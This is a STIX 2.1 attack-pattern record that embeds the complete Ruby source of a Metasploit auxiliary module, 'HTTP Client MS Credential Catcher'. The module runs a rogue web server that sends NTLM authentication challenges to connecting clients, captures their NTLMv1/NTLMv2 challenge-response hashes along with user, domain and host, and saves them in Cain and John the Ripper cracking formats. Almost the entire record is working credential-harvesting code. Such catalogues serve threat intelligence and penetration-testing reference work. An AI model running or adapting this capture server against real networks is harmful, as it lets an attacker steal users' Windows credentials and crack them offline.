{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--561d5801-4f88-4eeb-93ad-347b645f3a77",
    "created": "2024-08-14T16:22:00.81403Z",
    "modified": "2024-08-14T16:22:00.814035Z",
    "name": "HTTP Client MS Credential Catcher",
    "description": " This module attempts to quietly catch NTLM/LM Challenge hashes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/http_ntlm.rb",
            "external_id": "http_ntlm.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nNTLM_CONST = Rex::Proto::NTLM::Constants\nNTLM_CRYPT = Rex::Proto::NTLM::Crypt\nMESSAGE = Rex::Proto::NTLM::Message\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HTTP Client MS Credential Catcher',\n      'Description' => %q{\n          This module attempts to quietly catch NTLM/LM Challenge hashes.\n        },\n      'Author'      =>\n        [\n          'Ryan Linn <sussurro[at]happypacket.net>',\n        ],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'WebServer', 'Description' => 'Run capture web server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'WebServer'\n        ],\n      'DefaultAction'  => 'WebServer'))\n\n    register_options([\n      #OptString.new('LOGFILE',     [ false, \"The local filename to store the captured hashes\", nil ]),\n      OptString.new('CAINPWFILE',  [ false, \"The local filename to store the hashes in Cain&Abel format\", nil ]),\n      OptString.new('JOHNPWFILE',  [ false, \"The prefix to the local filename to store the hashes in JOHN format\", nil ]),\n      OptString.new('CHALLENGE',   [ true, \"The 8 byte challenge \", \"1122334455667788\" ])\n\n    ])\n\n    register_advanced_options([\n      OptString.new('DOMAIN',  [ false, \"The default domain to use for NTLM authentication\", \"DOMAIN\"]),\n      OptString.new('SERVER',  [ false, \"The default server to use for NTLM authentication\", \"SERVER\"]),\n      OptString.new('DNSNAME',  [ false, \"The default DNS server name to use for NTLM authentication\", \"SERVER\"]),\n      OptString.new('DNSDOMAIN',  [ false, \"The default DNS domain name to use for NTLM authentication\", \"example.com\"]),\n      OptBool.new('FORCEDEFAULT',  [ false, \"Force the default settings\", false])\n    ])\n\n  end\n\n  def on_request_uri(cli, request)\n    vprint_status(\"Request '#{request.uri}'\")\n\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    else\n      # If the host has not started auth, send 401 authenticate with only the NTLM option\n      if(!request.headers['Authorization'])\n        vprint_status(\"401 '#{request.uri}'\")\n        response = create_response(401, \"Unauthorized\")\n        response.headers['WWW-Authenticate'] = \"NTLM\"\n        response.headers['Proxy-Support'] = 'Session-Based-Authentication'\n        response.body =\n          \"<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>\"\n\n        cli.send_response(response)\n      else\n        vprint_status(\"Continuing auth '#{request.uri}'\")\n        method,hash = request.headers['Authorization'].split(/\\s+/,2)\n        # If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them\n        if(method != \"NTLM\")\n          print_status(\"Unrecognized Authorization header, responding with 404\")\n          send_not_found(cli)\n          return false\n        end\n\n        response = handle_auth(cli,hash)\n        cli.send_response(response)\n      end\n    end\n  end\n\n  def run\n    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{16})$/\n      @challenge = [ datastore['CHALLENGE'] ].pack(\"H*\")\n    else\n      print_error(\"CHALLENGE syntax must match 1122334455667788\")\n      return\n    end\n    exploit()\n  end\n\n  def process_options(cli, request)\n    print_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = \"\"\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def handle_auth(cli,hash)\n    # authorization string is base64 encoded message\n    message = Rex::Text.decode_base64(hash)\n\n    if(message[8,1] == \"\\x01\")\n      domain = datastore['DOMAIN']\n      server = datastore['SERVER']\n      dnsname = datastore['DNSNAME']\n      dnsdomain = datastore['DNSDOMAIN']\n\n      if(!datastore['FORCEDEFAULT'])\n        dom,ws = parse_type1_domain(message)\n        if(dom)\n          domain = dom\n        end\n        if(ws)\n          server = ws\n        end\n      end\n\n      response = create_response(401, \"Unauthorized\")\n      chalhash = MESSAGE.process_type1_message(hash,@challenge,domain,server,dnsname,dnsdomain)\n      response.headers['WWW-Authenticate'] = \"NTLM \" + chalhash\n      return response\n\n    # if the message is a type 3 message, then we have our creds\n    elsif(message[8,1] == \"\\x03\")\n      domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)\n      nt_len = ntlm_hash.length\n\n      if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session\n        arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,\n          :lm_hash => lm_hash,\n          :nt_hash => ntlm_hash\n        }\n\n        if arg[:lm_hash][16,32] == '0' * 32\n          arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE\n        end\n      # if the length of the ntlm response is not 24 then it will be bigger and represent\n      # a ntlmv2 response\n      elsif nt_len > 48 #lmv2/ntlmv2\n        arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,\n          :lm_hash   => lm_hash[0, 32],\n          :lm_cli_challenge  => lm_hash[32, 16],\n          :nt_hash   => ntlm_hash[0, 32],\n          :nt_cli_challenge  => ntlm_hash[32, nt_len  - 32]\n        }\n      elsif nt_len == 0\n        print_status(\"Empty hash from #{host} captured, ignoring ... \")\n      else\n        print_status(\"Unknown hash type from #{host}, ignoring ...\")\n      end\n\n      # If we get an empty hash, or unknown hash type, arg is not set.\n      # So why try to read from it?\n      if not arg.nil?\n        arg[:host] = host\n        arg[:user] = user\n        arg[:domain] = domain\n        arg[:ip] = cli.peerhost\n        html_get_hash(arg)\n      end\n\n      response = create_response(200)\n      response.headers['Cache-Control'] = \"no-cache\"\n      return response\n    else\n      response = create_response(200)\n      response.headers['Cache-Control'] = \"no-cache\"\n      return response\n    end\n\n  end\n\n  def parse_type1_domain(message)\n    domain = nil\n    workstation = nil\n\n    reqflags = message[12,4]\n    reqflags = reqflags.unpack(\"V\").first\n\n    if((reqflags & NTLM_CONST::NEGOTIATE_DOMAIN) == NTLM_CONST::NEGOTIATE_DOMAIN)\n      dom_len = message[16,2].unpack('v')[0].to_i\n      dom_off = message[20,2].unpack('v')[0].to_i\n      domain = message[dom_off,dom_len].to_s\n    end\n    if((reqflags & NTLM_CONST::NEGOTIATE_WORKSTATION) == NTLM_CONST::NEGOTIATE_WORKSTATION)\n      wor_len = message[24,2].unpack('v')[0].to_i\n      wor_off = message[28,2].unpack('v')[0].to_i\n      workstation = message[wor_off,wor_len].to_s\n    end\n    return domain,workstation\n\n  end\n\n  def html_get_hash(arg = {})\n    ntlm_ver = arg[:ntlm_ver]\n    if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE\n      lm_hash = arg[:lm_hash]\n      nt_hash = arg[:nt_hash]\n    else\n      lm_hash = arg[:lm_hash]\n      nt_hash = arg[:nt_hash]\n      lm_cli_challenge = arg[:lm_cli_challenge]\n      nt_cli_challenge = arg[:nt_cli_challenge]\n    end\n    domain = arg[:domain]\n    user = arg[:user]\n    host = arg[:host]\n    ip = arg[:ip]\n\n    unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then\n\n      @previous_lm_hash = lm_hash\n      @previous_ntlm_hash = nt_hash\n\n      # Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly\n      case ntlm_ver\n      when NTLM_CONST::NTLM_V1_RESPONSE\n        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack(\"H*\"),:srv_challenge => @challenge,\n                :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })\n          print_status(\"NLMv1 Hash correspond to an empty password, ignoring ... \")\n          return\n        end\n        if (lm_hash == nt_hash or lm_hash == \"\" or lm_hash =~ /^0*$/ ) then\n          lm_hash_message = \"Disabled\"\n        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack(\"H*\"),:srv_challenge => @challenge,\n                :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })\n          lm_hash_message = \"Disabled (from empty password)\"\n        else\n          lm_hash_message = lm_hash\n          lm_chall_message = lm_cli_challenge\n        end\n      when NTLM_CONST::NTLM_V2_RESPONSE\n        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack(\"H*\"),:srv_challenge => @challenge,\n                :cli_challenge => [nt_cli_challenge].pack(\"H*\"),\n                :user => Rex::Text::to_ascii(user),\n                :domain => Rex::Text::to_ascii(domain),\n                :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })\n          print_status(\"NTLMv2 Hash correspond to an empty password, ignoring ... \")\n          return\n        end\n        if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16\n          lm_hash_message = \"Disabled\"\n          lm_chall_message = 'Disabled'\n        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack(\"H*\"),:srv_challenge => @challenge,\n                :cli_challenge => [lm_cli_challenge].pack(\"H*\"),\n                :user => Rex::Text::to_ascii(user),\n                :domain => Rex::Text::to_ascii(domain),\n                :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })\n          lm_hash_message = \"Disabled (from empty password)\"\n          lm_chall_message = 'Disabled'\n        else\n          lm_hash_message = lm_hash\n          lm_chall_message = lm_cli_challenge\n        end\n\n      when NTLM_CONST::NTLM_2_SESSION_RESPONSE\n        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack(\"H*\"),:srv_challenge => @challenge,\n                :cli_challenge => [lm_hash].pack(\"H*\")[0,8],\n                :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })\n          print_status(\"NTLM2_session Hash correspond to an empty password, ignoring ... \")\n          return\n        end\n        lm_hash_message = lm_hash\n        lm_chall_message = lm_cli_challenge\n      end\n\n      # Display messages\n      domain = Rex::Text::to_ascii(domain)\n      user = Rex::Text::to_ascii(user)\n\n      capturedtime = Time.now.to_s\n      case ntlm_ver\n      when NTLM_CONST::NTLM_V1_RESPONSE\n        capturelogmessage =\n          \"#{capturedtime}\\nNTLMv1 Response Captured from #{host} \\n\" +\n          \"DOMAIN: #{domain} USER: #{user} \\n\" +\n          \"LMHASH:#{lm_hash_message ? lm_hash_message : \"<NULL>\"} \\nNTHASH:#{nt_hash ? nt_hash : \"<NULL>\"}\\n\"\n      when NTLM_CONST::NTLM_V2_RESPONSE\n        capturelogmessage =\n          \"#{capturedtime}\\nNTLMv2 Response Captured from #{host} \\n\" +\n          \"DOMAIN: #{domain} USER: #{user} \\n\" +\n          \"LMHASH:#{lm_hash_message ? lm_hash_message : \"<NULL>\"} \" +\n          \"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : \"<NULL>\"}\\n\" +\n          \"NTHASH:#{nt_hash ? nt_hash : \"<NULL>\"} \" +\n          \"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : \"<NULL>\"}\\n\"\n      when NTLM_CONST::NTLM_2_SESSION_RESPONSE\n        # we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr\n        # also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture\n        capturelogmessage =\n          \"#{capturedtime}\\nNTLM2_SESSION Response Captured from #{host} \\n\" +\n          \"DOMAIN: #{domain} USER: #{user} \\n\" +\n          \"NTHASH:#{nt_hash ? nt_hash : \"<NULL>\"}\\n\" +\n          \"NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : \"<NULL>\"} \\n\"\n\n      else # should not happen\n        return\n      end\n\n      print_status(capturelogmessage)\n\n      # DB reporting\n      # Rem : one report it as a smb_challenge on port 445 has breaking those hashes\n      # will be mainly use for psexec / smb related exploit\n      opts_report = {\n        ip: ip,\n        user: user,\n        domain: domain,\n        ntlm_ver: ntlm_ver,\n        lm_hash: lm_hash,\n        nt_hash: nt_hash\n      }\n      opts_report.merge!(lm_cli_challenge: lm_cli_challenge) if lm_cli_challenge\n      opts_report.merge!(nt_cli_challenge: nt_cli_challenge) if nt_cli_challenge\n\n      report_creds(opts_report)\n\n      #if(datastore['LOGFILE'])\n      #  File.open(datastore['LOGFILE'], \"ab\") {|fd| fd.puts(capturelogmessage + \"\\n\")}\n      #end\n\n      if(datastore['CAINPWFILE'] and user)\n        if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE\n          fd = File.open(datastore['CAINPWFILE'], \"ab\")\n          fd.puts(\n            [\n              user,\n              domain ? domain : \"NULL\",\n              @challenge.unpack(\"H*\")[0],\n              lm_hash ? lm_hash : \"0\" * 48,\n              nt_hash ? nt_hash : \"0\" * 48\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n          )\n          fd.close\n        end\n      end\n\n      if(datastore['JOHNPWFILE'] and user)\n        case ntlm_ver\n        when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE\n\n          fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', \"ab\")\n          fd.puts(\n            [\n              user,\"\",\n              domain ? domain : \"NULL\",\n              lm_hash ? lm_hash : \"0\" * 48,\n              nt_hash ? nt_hash : \"0\" * 48,\n              @challenge.unpack(\"H*\")[0]\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n          )\n          fd.close\n        when NTLM_CONST::NTLM_V2_RESPONSE\n          #lmv2\n          fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', \"ab\")\n          fd.puts(\n            [\n              user,\"\",\n              domain ? domain : \"NULL\",\n              @challenge.unpack(\"H*\")[0],\n              lm_hash ? lm_hash : \"0\" * 32,\n              lm_cli_challenge ? lm_cli_challenge : \"0\" * 16\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n          )\n          fd.close\n          #ntlmv2\n          fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , \"ab\")\n          fd.puts(\n            [\n              user,\"\",\n              domain ? domain : \"NULL\",\n              @challenge.unpack(\"H*\")[0],\n              nt_hash ? nt_hash : \"0\" * 32,\n              nt_cli_challenge ? nt_cli_challenge : \"0\" * 160\n            ].join(\":\").gsub(/\\n/, \"\\\\n\")\n          )\n          fd.close\n        end\n\n      end\n    end\n  end\n\n  def report_creds(opts)\n    ip = opts[:ip] || rhost\n    user = opts[:user] || nil\n    domain = opts[:domain] || nil\n    ntlm_ver = opts[:ntlm_ver] || nil\n    lm_hash = opts[:lm_hash] || nil\n    nt_hash = opts[:nt_hash] || nil\n    lm_cli_challenge = opts[:lm_cli_challenge] || nil\n    nt_cli_challenge = opts[:nt_cli_challenge] || nil\n\n    case ntlm_ver\n    when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE\n      hash = [\n        user, '',\n        domain ? domain : 'NULL',\n        lm_hash ? lm_hash : '0' * 48,\n        nt_hash ? nt_hash : '0' * 48,\n        @challenge.unpack('H*')[0]\n      ].join(':').gsub(/\\n/, '\\\\n')\n      report_hash(ip, user, 'netntlm', hash)\n    when NTLM_CONST::NTLM_V2_RESPONSE\n      hash = [\n        user, '',\n        domain ? domain : 'NULL',\n        @challenge.unpack('H*')[0],\n        lm_hash ? lm_hash : '0' * 32,\n        lm_cli_challenge ? lm_cli_challenge : '0' * 16\n      ].join(':').gsub(/\\n/, '\\\\n')\n      report_hash(ip, user, 'netlmv2', hash)\n\n      hash = [\n        user, '',\n        domain ? domain : 'NULL',\n        @challenge.unpack('H*')[0],\n        nt_hash ? nt_hash : '0' * 32,\n        nt_cli_challenge ? nt_cli_challenge : '0' * 160\n      ].join(':').gsub(/\\n/, '\\\\n')\n      report_hash(ip, user, 'netntlmv2', hash)\n    else\n      hash = domain + ':' +\n        ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : '00' * 24 ) + ':' +\n        ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  '00' * 24 ) + ':' +\n        datastore['CHALLENGE'].to_s\n      report_hash(ip, user, nil, hash)\n    end\n  end\n\n  def report_hash(ip, user, type_hash, hash)\n    service_data = {\n      address: ip,\n      port: 445,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :nonreplayable_hash,\n      username: user\n    }.merge(service_data)\n\n    unless type_hash.nil?\n      credential_data.merge!(jtr_format: type_hash)\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\nend\n"
}